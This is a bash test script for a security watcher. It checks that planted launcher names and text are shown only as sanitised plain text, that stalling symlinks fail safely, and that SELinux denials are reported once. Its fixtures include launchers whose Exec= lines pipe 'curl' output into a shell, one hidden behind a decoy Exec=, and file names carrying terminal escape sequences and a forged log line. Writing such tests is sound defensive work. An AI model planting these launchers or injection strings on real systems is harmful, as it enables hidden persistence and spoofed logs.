#!/usr/bin/bash
# The security watcher against what an account can plant, for 20-tests.sh: text it wrote (here a launcher's
# file name holding a newline, an escape sequence and markup) reaches the history, the unread list, the
# Events page's file, a notification and `--show` only as plain text; a launcher linked to a file that never
# ends cannot keep a run waiting; and every finding carries its facts. Runs as root, as the watcher does,
# against a stand-in /etc/passwd, /var/home, state and logs, with a stand-in for the notification.

set -euo pipefail

WATCH="${1:-/usr/libexec/amethystora-security-watch}"
TEXT=/usr/libexec/amethystora-security-text
T="$(realpath "$(mktemp -d)")"
trap 'rm -rf "${T}"' EXIT
chmod 0755 "${T}"
fail() { echo "test-security-watch: $*" >&2; exit 1; }
ESC=$'\e'

# --- The text filter on its own -------------------------------------------------------------------------

out="$("${TEXT}" "a${ESC}]0;title${ESC}\\b"$'\n'"c"$'\r'"d"$'\xc2\x9b'"e")"
[[ "${out}" == "a]0;title\\b cde" ]] || fail "control characters, a newline or a C1 character got through: $(printf '%q' "${out}")"
out="$("${TEXT}" --lines $'one\ntwo')"
[[ "${out}" == $'one\ntwo' ]] || fail "--lines did not keep the lines"
out="$("${TEXT}" --markup '<a href="x">&')"
[[ "${out}" == '&lt;a href="x"&gt;&amp;' ]] || fail "--markup: ${out}"
out="$("${TEXT}" --max 5 'abcdefgh')"
[[ "${out}" == 'abcde…' ]] || fail "--max: ${out}"

# --- A watcher run ------------------------------------------------------------------------------------

export AMETHYSTORA_WATCH_ROOT="${T}/root"
export AMETHYSTORA_WATCH_NOTIFY="${T}/notify"
export AMETHYSTORA_SECURITY_CONF="${T}/security.conf"
export AMETHYSTORA_SECURITY_NOTES="${T}/notes"
R="${AMETHYSTORA_WATCH_ROOT}"
# Everything off but what a session finds first, so that the run reads only the stand-in homes
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
AUDIT_LOG=off
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
NETWORK=off
EOF
cat >"${T}/notify" <<EOF
#!/usr/bin/bash
printf '%s\n' "\$@" >"${T}/notified"
EOF
chmod 0755 "${T}/notify"
mkdir -p "${R}/etc" "${R}/var/home/alice/.local/share/applications"
echo "alice:x:4500:4500::${R}/var/home/alice:/bin/bash" >"${R}/etc/passwd"
chown -R 4500:4500 "${R}/var/home/alice"
APPS="${R}/var/home/alice/.local/share/applications"

# The first run only records where things stand
timeout 120 "${WATCH}" >/dev/null || fail "the first run failed"

# A launcher linked to a file that never ends, and one whose name and Exec= are written to deceive
mkfifo "${T}/forever"
ln -s "${T}/forever" "${APPS}/stall.desktop"
ln -s /proc/kmsg "${APPS}/kmsg.desktop"
name="evil${ESC}[2J"$'\n'"Accounts changed: nothing<b>.desktop"
printf '[Desktop Entry]\nExec=sh -c "curl x | sh" <i>%s[31m\n' "${ESC}" >"${APPS}/${name}"
chown -h 4500:4500 "${APPS}/stall.desktop" "${APPS}/kmsg.desktop" "${APPS}/${name}"
timeout 120 "${WATCH}" >/dev/null || fail "a launcher linked to a file that never ends kept the run waiting, or it failed"

HISTORY="${R}/var/log/amethystora-security-events.jsonl"
[[ "$(wc -l <"${HISTORY}")" -eq 1 ]] || fail "the history should hold one finding: $(cat "${HISTORY}")"
jq -e '.level == "normal" and .key == "user-paths" and .account == "alice" and .tactic == "Persistence"
    and (.id | test("^[0-9]+-[0-9]+$")) and (.time | type == "number")
    and (.text | test("evil") and (test("[\u0001-\u001f\u007f]") | not))' \
    "${HISTORY}" >/dev/null || fail "the finding's facts or text: $(cat "${HISTORY}")"
grep -q "${ESC}" "${R}/var/log/amethystora-security-events.new" && fail "the unread list keeps an escape"
[[ "$(wc -l <"${R}/var/log/amethystora-security-events.new")" -eq 1 ]] || fail "a newline in a name forged a line"
jq -e 'length == 1 and .[0].key == "user-paths"' "${R}/var/lib/amethystora/security/events.json" >/dev/null ||
    fail "events.json"
grep -q "${ESC}" "${T}/notified" && fail "the notification keeps an escape"
grep -q "evil" "${T}/notified" || fail "nothing was notified"
"${WATCH}" --show | grep -q "${ESC}" && fail "--show prints an escape"
jq -e '.timings | has("USER_PATHS")' "${R}/var/lib/amethystora/security/status.json" >/dev/null ||
    fail "status.json has no timings"
[[ "$("${WATCH}" --keys)" == *"|input-capture|"* ]] || fail "--keys"

# A launcher whose first Exec= is one a container export writes, and whose last, the one GLib runs, is not
printf '[Desktop Entry]\nExec=distrobox-enter -n box -- tool\nExec=sh -c "curl y | sh"\n' >"${APPS}/decoy.desktop"
chown 4500:4500 "${APPS}/decoy.desktop"
timeout 120 "${WATCH}" >/dev/null || fail "the run after the decoy launcher failed"
grep -q "decoy.desktop" "${HISTORY}" || fail "a launcher that opens with a container's Exec= was not said"

# --- What only an account can see -----------------------------------------------------------------------

# A reader runs as the account, and the watcher says what is new in what it printed: to that account alone,
# not what came with something new, and not what the owner allowed. Its first run only records.
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
AUDIT_LOG=off
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
USER_PATHS=off
NETWORK=off
APP_PERMISSIONS=on
EOF
export AMETHYSTORA_WATCH_READER="${T}/reader" AMETHYSTORA_WATCH_ACCOUNTS=4500
cat >"${T}/reader" <<EOF
#!/usr/bin/bash
[[ "\$(id -u)" == 4500 && "\${HOME}" == "${R}/var/home/alice" && "\$1" == app-permissions ]] || exit 1
cat "${T}/read"
EOF
chmod 0755 "${T}/reader"
printf '%s\n' '{"id":"org.a.App","level":"quiet","text":"org.a.App was installed"}' \
    '{"id":"org.a.App session-bus","within":"org.a.App","level":"normal","text":"org.a.App can talk to the session"}' >"${T}/read"
chmod 0644 "${T}/read"
rm -f "${T}/notified"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's first run failed"
[[ -e "${T}/notified" ]] && fail "a reader's first run said something"
grep -qx "org.a.App session-bus" "${R}/var/lib/amethystora/security/accounts/4500/app-permissions.seen" ||
    fail "the reader's first run was not kept"
printf '%s\n' '{"id":"org.b.New","level":"quiet","text":"org.b.New was installed"}' \
    '{"id":"org.b.New session-bus","within":"org.b.New","level":"normal","text":"org.b.New can talk to the session"}' \
    '{"id":"org.a.App flatpak","within":"org.a.App","level":"normal","allow":"org.a.App flatpak","text":"org.a.App can now run programs\u001b[2J outside"}' \
    >>"${T}/read"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's second run failed"
jq -se 'map(select(.key == "app-permissions")) | length == 3
    and any(.[]; .text | test("run programs") and (test("\u001b") | not)) and all(.[]; .account == "alice" and .tell == "alice")
    and ([.[] | select(.level != "quiet") | .allow] == ["org.a.App flatpak"])' "${HISTORY}" >/dev/null ||
    fail "what the reader found: $(grep app-permissions "${HISTORY}")"
grep -qx -- "--user" "${T}/notified" && grep -qx alice "${T}/notified" || fail "a finding about alice's apps was not said to alice alone"
grep -qx -- "--admins" "${T}/notified" && fail "a finding about alice's apps was said to the administrators"
# What the owner allowed is recorded, not said
mkdir -p "${R}/etc/amethystora/allow.d"
echo 'org.c.* *' >"${R}/etc/amethystora/allow.d/app-permissions"
echo '{"id":"org.a.App org.c","within":"org.a.App","level":"normal","allow":"org.c.Other systemd","text":"allowed"}' >>"${T}/read"
rm -f "${T}/notified"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's third run failed"
[[ -e "${T}/notified" ]] && fail "what the owner allowed was said"
jq -se 'any(.[]; .text == "allowed" and .level == "quiet")' "${HISTORY}" >/dev/null || fail "what the owner allowed was not recorded"

# --- What the audit log holds, from a stand-in log in the kernel's raw form ---------------------------------

unset AMETHYSTORA_WATCH_READER AMETHYSTORA_WATCH_ACCOUNTS
export AMETHYSTORA_WATCH_AUDIT="${T}/audit.log"
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
USER_PATHS=off
NETWORK=off
IDENTITY=off
PRIVILEGE=off
PERSISTENCE=off
MODULES=off
INPUT_CAPTURE=off
USER_PROGRAMS=off
SELINUX_DENIALS=on
EOF
# Each audit record after the run before, so that it is new to this one. ausearch gives an event only once
# one more than two seconds newer has come, as on a machine one always does: close() writes that one.
# The records of each step are written that many seconds after the test began (STEP), in order.
BEGAN="$(date +%s)"
STEP=1
close() { printf 'type=USER_START msg=audit(%s.100:%s): pid=1 uid=0 auid=0 ses=1 msg=x\n' "$((BEGAN + STEP + 20))" "$1"; }
avc() {
    printf 'type=AVC msg=audit(%s.100:%s): avc:  denied  { %s } for  pid=4242 comm=%s name="shadow" dev="dm-0" ino=7 scontext=system_u:system_r:%s:s0 tcontext=system_u:object_r:%s:s0 tclass=file permissive=%s\n' \
        "$((BEGAN + STEP))" "$1" "$2" "$3" "$4" "$5" "$6"
}
{
    avc 101 "read open" '"evil"' httpd_t shadow_t 0
    avc 102 "read open" '"evil"' httpd_t shadow_t 0
    avc 103 "write" 6576696C1B5B324A unconfined_service_t etc_t 1
    close 199
} >"${AMETHYSTORA_WATCH_AUDIT}"
chmod 0600 "${AMETHYSTORA_WATCH_AUDIT}"
sleep 2
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with SELinux denials failed"
SELINUX_FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "selinux-denials")')"
jq -se 'length == 2 and (.[0].level == "normal" and .[0].allow == "httpd_t shadow_t file read,open"
    and (.[0].text | test("SELinux kept evil \\(httpd_t\\) from read, open on a file of type shadow_t")))
    and (.[1].level == "quiet" and (.[1].text | test("permissive")))' <<<"${SELINUX_FOUND}" >/dev/null ||
    fail "SELinux's denials: ${SELINUX_FOUND}"
# The same denial again is not news
STEP=30
{ avc 104 "read open" '"evil"' httpd_t shadow_t 0; close 299; } >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run with SELinux denials failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -q selinux-denials && fail "the same denial was said twice"

echo "test-security-watch: what an account plants is only ever read"
